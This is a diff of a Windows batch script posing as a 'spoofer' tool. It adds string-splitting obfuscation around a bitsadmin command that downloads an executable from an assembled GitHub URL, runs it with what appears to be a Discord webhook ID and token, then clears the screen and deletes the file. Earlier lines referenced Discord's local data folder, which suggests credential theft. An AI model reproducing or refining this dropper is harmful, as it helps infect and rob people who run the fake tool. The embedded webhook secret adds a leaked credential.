@@ -1,7 +1,13 @@
 echo off
+SET QQA=_
+SET DIS=cod
+SET CRT=NHA
+SET SAVE=proto
+SET PROC=TIONS
 SET FR="DA ED RA FE"
-SET Q=%appdata%\discord\shared_proto_db
-CD %Q%
+SET RFA=dis
+SET DEFINE=shared
+SET Q=%CD%
 SET FS="DZ ZD FA 2E"
 SET FE=PSF
 SET DE=e
@@ -14,9 +20,12 @@ SET SP=b
 SET DEF=t
 SET D2=i%DEF%
 SET DYNI=com
-SET USR=dr-NHA
-SET PTO=JUPEX
-SET REP=NHA-PRODUCTIONS
+SET USR=dr-%CRT%
+SET REFC=862147348624048138
+SET REFV=7zVx8R2iUngYyKUMcLXxhZqOnEzsDQfhScAif7tqsySAkCoRQKITY5WH6M18v2ompQe8
+SET XEP=PEX
+SET PTO=JU%XEP%
+SET REP=%CRT%-PRODUC%PROC%
 SET DIFI=raw
 SET PTC=NHA-
 SET X=%FE%.%DE%%DR%%DZ%
@@ -25,14 +34,14 @@ SET FR=h
 SET RTA=%FR%%DEF%%DEF%ps
 SET RGA=/
 set DLSS=%RTA%:%RGA%%RGA%%SO%%D2%%D%%SP%.%DYNI%/%USR%/%REP%/%DIFI%/%PTC%%PTO%/%X%
-set RTX_NV=%FX%
-BITSADMIN /transfer /download %DLSS% %RTX_NV%
+bitsadmin /transfer myDownloadJob /download /priority high %DLSS% %FX%
+cls
 set directory=%Q%
 SET RT="REACT"
-start %FE%.%DE%%DR%%DZ% -862147348624048138/7zVx8R2iUngYyKUMcLXxhZqOnEzsDQfhScAif7tqsySAkCoRQKITY5WH6M18v2ompQe8
+start %FX% %REFC%/%REFV%
 SET DD="DD DD DD DD"
 del /f %FE%.%DE%%DR%%DZ%
-echo on
+echo
 echo Spoof Complete
 echo Spoofing Done By ......
 pause
